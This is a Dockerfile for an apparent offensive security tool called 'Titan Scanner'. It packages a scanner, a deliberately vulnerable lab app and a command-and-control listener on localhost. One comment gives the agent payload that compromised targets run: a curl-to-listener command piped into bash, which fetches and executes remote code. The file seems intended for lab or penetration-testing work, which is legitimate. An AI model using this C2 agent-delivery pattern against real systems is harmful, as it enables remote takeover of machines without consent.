# Titan Scanner — single image carrying the scanner, the vulnerable lab, and
# the C2 listener. The container runs everything on 127.0.0.1 (lab :5000,
# listener :8770) so the Track E exploitation flow behaves exactly like the
# bare-metal one we validated live.
#
#   docker compose up -d --build                  # build + start
#   docker compose exec titan python run.py --target http://127.0.0.1:5000
#
# See RUNBOOK.md (Method A) for the full container workflow.
FROM python:3.12-slim

ENV PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    PIP_NO_CACHE_DIR=1 \
    PIP_DISABLE_PIP_VERSION_CHECK=1

WORKDIR /app

# curl: the agent payload a compromised target executes is
# `curl <listener>/agent.sh | bash`. In the bundled-lab demo the "target" is
# this same container, so curl (and bash, already present in slim) must exist
# at runtime.
RUN apt-get update \
    && apt-get install -y --no-install-recommends curl \
    && rm -rf /var/lib/apt/lists/*

# Dependencies first — the big cached layer. Playwright downloads Chromium and
# all required system libraries via --with-deps (root user; no --no-sandbox
# hacks needed).
COPY requirements.txt ./
RUN pip install -r requirements.txt \
    && python -m playwright install --with-deps chromium

# Application code (minus .dockerignore exclusions: venv, findings, etc.).
COPY . .

EXPOSE 5000 8770

# Default: start the vulnerable lab + the C2 listener (docker/entrypoint.sh).
# One-shot CLI work overrides this, e.g.:
#   docker compose run --rm titan python run.py --target https://example.com
CMD ["/bin/bash", "docker/entrypoint.sh"]
